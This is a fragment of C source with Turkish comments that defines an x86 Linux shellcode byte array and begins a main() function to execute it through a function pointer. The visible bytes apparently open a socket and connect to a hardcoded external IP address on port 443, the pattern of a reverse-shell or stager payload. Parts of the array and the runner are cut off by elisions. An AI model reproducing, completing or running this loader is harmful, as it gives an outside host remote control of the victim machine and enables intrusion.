...
// Shellcode'u tanımlayın
const char shellcode[] = "\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66"
"\x89\xe1\xcd\x80\x97\x5b\x68\x51\xa1\xe5\x28\x68\x02\x00"
"\x01\xbb\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd"
...
int main() {
    // Shellcode'un boyutunu alın
    size_t shellcode_size = strlen(shellcode);

    // Shellcode'u çalıştırmak için bir fonksiyon işaretçisi oluşturun
